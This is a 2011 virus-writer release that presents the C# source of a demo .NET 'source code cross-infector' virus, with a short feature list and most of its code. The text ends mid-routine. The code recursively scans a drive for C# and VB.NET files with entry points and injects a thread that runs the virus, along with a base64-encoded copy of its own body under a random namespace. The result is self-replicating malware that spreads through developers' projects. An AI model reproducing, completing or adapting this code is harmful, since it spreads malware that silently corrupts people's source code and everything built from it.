.NET Source Code Cross-Infector (Neoter and Rhiannon)
-----------------------------------------------------
by alcopaul/brigada ocho
may 24, 2011

Below is the demo virus for my article ".NET Source Code Cross-Infection"

Features

1.) Infects *.cs files with entrypoint ("Main(string[] args)") and *.vb files with "Sub Main()" or "_Load()"
2.) Infects 5 files per run
3.) Polymorphic namespace will ensure unique instances of the virus contained in multiple source files of a single project


If present in a .cs file
------------------------

using System;
class DeclareArraysSample
{
    public static void Main(string[] args)
	{
	System.Threading.Thread gxzxzxzxz = new System.Threading.Thread(gw3hhiw5j4lh.Virus.LOL);
	gxzxzxzxz.Start();
    }
}



namespace gw3hhiw5j4lh
{
    public class Virus
    {
        private static string namespacex = "";
        private static int counter = 0;
        private static string database = "TmFtZXNwYWNlIGhtMTIzNA0KICAgIFB1YmxpYyBDbGFzcyBWaXJ1cw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBuYW1lc3BhY2V4IEFzIFN0cmluZyA9ICIiDQogICAgICAgIFByaXZhdGUgU2hhcmVkIGNvdW50ZXIgQXMgSW50ZWdlciA9IDANCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgZGF0YWJhc2UgQXMgU3RyaW5nID0gIg==>>bmFtZXNwYWNlIGhtMTIzNA0Kew0KICAgIHB1YmxpYyBjbGFzcyBWaXJ1cw0KICAgIHsNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIG5hbWVzcGFjZXggPSAiIjsNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgaW50IGNvdW50ZXIgPSAwOw0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgZGF0YWJhc2UgPSAi>";
        public static void LOL()
        {
            string xy = System.IO.Directory.GetDirectoryRoot(System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(@xy);
            AndLetsRock(dir);
        }
        private static void AndLetsRock(System.IO.DirectoryInfo d)
        {
            string lookfor = "*.cs>*.vb";
            string[] extensions = lookfor.Split(new char[] { '>' });
            System.Collections.ArrayList myfileinfos = new System.Collections.ArrayList();
            foreach (string ext in extensions)
            {
                myfileinfos.AddRange(d.GetFiles(ext));
            }
            System.IO.FileInfo[] xfinal = (System.IO.FileInfo[])myfileinfos.ToArray(typeof(System.IO.FileInfo));
            foreach (System.IO.FileInfo file in xfinal)
            {
                string filename = file.FullName;
                string ext = System.IO.Path.GetExtension(filename);
                try
                {
                    System.IO.StreamReader readerx = new System.IO.StreamReader(filename);
                    string gLoww = readerx.ReadToEnd();
                    readerx.Close();
                    if (ext == ".cs")
                    {
                        if (gLoww.ToLower().IndexOf("main(") >= 0)
                        {
                            if (gLoww.IndexOf("alcopaul") >= 0)
                            {
                            }
                            else
                            {
                                infect(filename, gLoww, ext, 0);
                                counter += 1;
                                if (counter == 5)
                                {
                                    return;
                                }
                            }
                        }
                    }
                    else if (ext == ".vb")
                    {                        
                        if (gLoww.ToLower().IndexOf("sub main()") >= 0)
                        {
                            if (gLoww.IndexOf("alcopaul") >= 0)
                            {
                            }
                            else
                            {
                                infect(filename, gLoww, ext, 1);
                                counter += 1;
                                if (counter == 5)
                                {
                                    return;
                                }
                            }
                        }
                        else if (gLoww.IndexOf("_Load(") >= 0)
                        {
                            if (gLoww.IndexOf("alcopaul") >= 0)
                            {
                            }
                            else
                            {
                                infect(filename, gLoww, ext, 2);
                                counter += 1;
                                if (counter == 5)
                                {
                                    return;
                                }
                            }
                        }
                    }
                }
                catch
                {
                    continue;
                } 
            }
            System.IO.DirectoryInfo[] dirs = d.GetDirectories("*.*");
            foreach (System.IO.DirectoryInfo dir in dirs)
            {
                try
                {
                    if (counter == 5)
                    {
                        return;
                    }
                    AndLetsRock(dir);
                }
                catch { continue; }
            }
        }
        private static string GetRandomString()
        {
            string pathx = System.IO.Path.GetRandomFileName();
            pathx = pathx.Replace(".", "");
            return "g" + pathx;
        }
        private static void infect(string file, string s, string ext, int g)
        {
            namespacex = GetRandomString();
            if (ext == ".vb")
            {
                string gggx = "";
                if (g == 2)
                {
                string gggg = s.Substring((s.IndexOf("_Load(") + 6), s.IndexOf(".Load") - (s.IndexOf("_Load(") + 6));
                s = s.Replace(gggg, "");
                gggx = s.Replace("_Load(.Load", "_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load\r\n\tDim hxxxx As New " + namespacex + ".Virus\r\n\tDim gxxxx As New System.Threading.Thread(AddressOf hxxxx.LOL)\r\n\tgxxxx.Start()\r\n");
                }
                else if (g == 1)
                {
                gggx = s.Replace("Sub Main()", "Sub Main()\r\n\tDim hxxxx As New " + namespacex + ".Virus\r\n\tDim gxxxx As New System.Threading.Thread(AddressOf hxxxx.LOL)\r\n\tgxxxx.Start()\r\n");
                }
                string[] t = database.Split(new char[] { '>' });
                string body0 = decodeb64(t[0]).Replace(decodeb64("aG0xMjM0"), namespacex);
                writerx(file, gggx + "\r\n" + body0 + database + decodeb64(t[1]) + "\r\n");
            }
            else if ((ext == ".cs") && (g == 0))
            {
                int x = s.ToLower().IndexOf("main(");
                int yy = x;
                char[] xx = s.ToCharArray(0, s.Length - 1);
                while (xx[yy] != '{')
                {
                    yy += 1;
                }
